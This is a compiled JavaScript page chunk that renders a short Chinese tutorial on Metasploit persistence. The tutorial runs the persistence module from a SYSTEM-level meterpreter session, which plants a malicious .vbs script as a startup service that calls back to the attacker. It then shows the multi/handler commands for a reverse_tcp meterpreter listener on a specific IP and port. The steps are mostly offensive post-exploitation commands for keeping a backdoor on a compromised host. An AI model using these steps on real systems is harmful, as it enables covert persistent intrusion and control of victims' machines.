(window.webpackJsonp=window.webpackJsonp||[]).push([[170],{624:function(e,s,t){"use strict";t.r(s);var a=t(24),n=Object(a.a)({},(function(){var e=this,s=e.$createElement,t=e._self._c||s;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("h1",{attrs:{id:"metasploit访问控制的持久化"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#metasploit访问控制的持久化"}},[e._v("#")]),e._v(" Metasploit访问控制的持久化")]),e._v(" "),t("p",[e._v("工具：Metasploit")]),e._v(" "),t("p",[e._v("为了实现这一点，可以选择在目标计算机上添加一个新的用户，也可以选择使用MSF中persistence模块。")]),e._v(" "),t("p",[e._v("运行persistence模块可以通过在目标计算机上安装一个永久性的后门来实现访问控制的持久化。这样，即使有一天目标计算机修补了漏洞，我们仍然可以通过这个连接来实现对目标计算机的控制。")]),e._v(" "),t("p",[e._v("这里，我们假设经过了一系列的渗透拿到了system权限的meterpreter，我们在meterpreter命令行执行如下命令：")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("run persistence\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("运行persistence模块会向目标计算机上传一个.vbs类型的恶意脚本文件，并在目标计算机上执行这个恶意脚本文件。这个脚本一旦在目标计算机上运行，每隔几秒钟就会主动连接攻击者的计算机。这个恶意脚本文件会被当做一个系统服务安装在目标计算机系统中，同时，会被添加到开机启动项中，因此，无论目标计算机重启多少次，该恶意服务都可以运行。除非卸载该服务或手动删除文件，否则恶意服务一直存在。")]),e._v(" "),t("p",[e._v("这里，我们重新开启一个MSF来验证：")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("msfconsole\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.109.137\nset LPORT 4444\nexploit\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br"),t("span",{staticClass:"line-number"},[e._v("3")]),t("br"),t("span",{staticClass:"line-number"},[e._v("4")]),t("br"),t("span",{staticClass:"line-number"},[e._v("5")]),t("br"),t("span",{staticClass:"line-number"},[e._v("6")]),t("br")])]),t("p",[e._v("此处需要注意的是：我们设置攻击载荷和LPORT选项必须与运行persistence模块时设置的攻击载荷和LPORT选项相同。")]),e._v(" "),t("p",[e._v("发出攻击命令exploit后，exploit/multi/handler开始等待从目标系统上发回来的连接。一旦传入的连接被检测到，控制端就会切换到Meterpreter命令行。")])])}),[],!1,null,null,null);s.default=n.exports}}]);